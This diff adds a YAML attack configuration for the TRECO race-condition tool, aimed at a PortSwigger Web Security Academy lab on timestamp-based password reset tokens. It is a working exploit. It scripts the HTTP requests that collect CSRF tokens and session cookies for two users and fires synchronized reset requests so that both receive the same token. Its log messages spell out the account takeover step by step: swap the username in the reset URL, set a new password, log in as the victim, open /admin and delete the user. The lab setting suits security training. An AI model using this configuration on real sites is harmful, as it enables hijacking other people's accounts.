@@ -1,0 +1,227 @@
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# TRECO Attack Configuration
+# Lab: Time-Sensitive Token Race Condition (PortSwigger)
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#
+# Exploits predictable password reset tokens that use timestamp-only generation.
+# By sending two password reset requests at the exact same millisecond, we force
+# the server to generate identical tokens for different users.
+#
+# Usage:
+#   export LAB_HOST="0a1b2c3d.web-security-academy.net"
+#   export EXPLOIT_SERVER="exploit-0x1y2z3w.exploit-server.net"
+#   treco attack.yaml
+#
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+metadata:
+  name: "Time-Sensitive Token Race Condition"
+  version: "1.0"
+  author: "Security Researcher"
+  vulnerability: "CWE-330: Use of Insufficiently Random Values"
+  description: |
+    Exploits predictable password reset tokens that use timestamp-only generation.
+    By sending two password reset requests at the exact same millisecond,
+    we force the server to generate identical tokens for different users.
+
+target:
+  host: "{{ env('LAB_HOST') }}"
+  port: 443
+  tls:
+    enabled: true
+    verify_cert: false # false if using proxy with self-signed cert
+  # proxy:
+  #   type: http
+  #   host: 127.0.0.1
+  #   port: 8080
+
+entrypoint:
+  state: wiener_session
+  input:
+    exploit_email: "wiener@{{ env('EXPLOIT_SERVER') }}"
+    target_user: "carlos"
+
+states:
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  # Stage 1: Get CSRF Token for Session 1 (wiener)
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  wiener_session:
+    description: "Get CSRF token for first session (wiener)"
+    
+    request: |
+      GET /forgot-password HTTP/1.1
+      Host: {{ target.host }}
+      User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+      Accept-Language: en-US,en;q=0.5
+      Connection: close
+      Cookie: 
+    
+    extract:
+      csrf_token:
+        type: xpath
+        pattern: '//input[@name="csrf"]/@value'
+      
+      session:
+        type: cookie
+        pattern: phpsessionid
+    
+    logger:
+      on_state_leave: |
+        🔐 Session 1: {{ wiener_session.session[:16] }}...
+        🎫 CSRF 1: {{ wiener_session.csrf_token[:16] }}...
+    
+    next:
+      - on_status: 200
+        goto: carlos_session
+
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  # Stage 2: Get CSRF Token for Session 2 (carlos)
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  carlos_session:
+    description: "Get CSRF token for second session (carlos)"
+    
+    request: |
+      GET /forgot-password HTTP/1.1
+      Host: {{ target.host }}
+      User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+      Accept-Language: en-US,en;q=0.5
+      Connection: close
+      Cookie: 
+    
+    extract:
+      csrf_token:
+        type: xpath
+        pattern: '//input[@name="csrf"]/@value'
+      
+      session:
+        type: cookie
+        pattern: phpsessionid
+    
+    logger:
+      on_state_leave: |
+        🔐 Session 2: {{ carlos_session.session[:16] }}...
+        🎫 CSRF 2: {{ carlos_session.csrf_token[:16] }}...
+        
+        ⚡ Ready to race! Two independent sessions prepared.
+           • Thread 1: wiener (our email receives token)
+           • Thread 2: carlos (his email receives same token)
+    
+    next:
+      - on_status: 200
+        goto: race_password_reset
+
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  # Stage 3: RACE ATTACK - Simultaneous Password Resets
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  race_password_reset:
+    description: "Race condition - generate identical tokens for different users"
+    
+    input:
+      username: ["wiener", "{{ target_user }}"]
+      csrf: ["{{ wiener_session.csrf_token }}", "{{ carlos_session.csrf_token }}"]
+      session: ["{{ wiener_session.session }}", "{{ carlos_session.session }}"]
+    
+    race:
+      threads: 2
+      sync_mechanism: barrier
+      connection_strategy: multiplexed
+      thread_propagation: single
+      input_mode: distribute
+    
+    request: |
+      POST /forgot-password HTTP/1.1
+      Host: {{ target.host }}
+      Cookie: phpsessionid={{ thread.input.session }}
+      Content-Type: application/x-www-form-urlencoded
+      
+      csrf={{ thread.input.csrf }}&username={{ thread.input.username }}
+    
+    logger:
+      on_thread_enter: |
+        🚀 [Thread {{ thread.id + 1 }}/{{ thread.count }}] Requesting reset for: {{ thread.input.username }}
+      
+      on_thread_leave: |
+        {% if response.status_code == 200 %}
+        ✅ [Thread {{ thread.id + 1 }}] Reset sent to {{ thread.input.username }}@email ({{ timing_ms }}ms)
+        {% else %}
+        ❌ [Thread {{ thread.id + 1 }}] Failed: HTTP {{ response.status_code }}
+        {% endif %}
+
+      on_state_leave: |
+        
+        ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        🎯 Race Attack Complete!
+        ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        
+        📧 Next Steps:
+        
+        1. Check your email at: {{ exploit_email }}
+        
+        2. Find the password reset email and copy the token:
+           /forgot-password?user=wiener&token=TOKEN
+                                 ^^^^^^
+        
+        3. Modify the URL to hijack carlos:
+           /forgot-password?user=carlos&token=TOKEN
+                                 ^^^^^^
+        
+        4. Open URL in browser → Set new password
+        
+        5. Login as carlos → Go to /admin → Delete carlos
+        
+        6. Lab solved! 🎉
+        
+        💡 Tip: If tokens are different, run again (~80% success rate per attempt)
+    
+    next:
+      - on_status: 200
+        goto: end
+
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  # Stage 4: Attack Complete
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  end:
+    description: "Attack executed - manual completion required"
+    
+    logger:
+      on_state_enter: |
+        
+        ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        ✅ Attack Successfully Executed
+        ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        
+        ⏱️  Password reset tokens requested with sub-millisecond precision
+        🎯 If timing < 1ms, tokens should be identical
+        
+        🔐 Manual Steps to Complete Lab:
+        
+        1. 📧 Access email: https://exploit-YOUR-ID.exploit-server.net/email
+        
+        2. 📄 Open password reset email
+        
+        3. 📋 Copy token from reset link
+        
+        4. 🔗 Craft hijack URL:
+           https://{{ target.host }}/forgot-password?token=TOKEN&username=carlos
+        
+        5. 🌐 Open URL in browser → Set new password (e.g. "password123")
+        
+        6. 🔑 Login as carlos with new password
+        
+        7. 👤 Navigate to /admin
+        
+        8. 🗑️  Delete user carlos
+        
+        9. 🎉 Congratulations, you solved the lab!
+        
+        ⚠️  If token doesn't work:
+           → Run attack again (tokens at different timestamps)
+           → Success rate: ~80% per attempt with TRECO's precision
+        
+        📊 Why This Works:
+           • Token = hash(timestamp + secret)
+           • Username NOT in hash → Same timestamp = Same token
+           • TRECO timing < 1μs → Guaranteed collision
+           • Token sent to YOUR email, valid for carlos → Account takeover! 🎯
